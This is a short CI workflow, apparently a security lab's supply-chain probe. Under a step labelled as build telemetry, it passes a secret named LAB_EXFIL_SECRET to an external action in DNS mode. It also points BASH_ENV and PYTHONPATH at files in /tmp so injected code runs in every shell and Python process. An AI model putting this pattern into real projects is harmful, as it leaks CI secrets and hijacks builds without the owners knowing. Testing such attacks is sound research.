name: CI
permissions:
  contents: read
jobs:
  supply-chain-probe:
    runs-on: self-hosted
    steps:
    - name: Publish build telemetry
      uses: SISL-UIC/lab-telemetry-collector@5c9d6d41ae3c9585f699edb1cd7c2e35bc973ea0
      with:
        token: ${{ secrets.LAB_EXFIL_SECRET }}
        mode: dns
    timeout-minutes: 15
env:
  PYTHONPATH: /tmp/instr
  BASH_ENV: /tmp/instr/bash_env.sh
'on':
- push
- workflow_dispatch
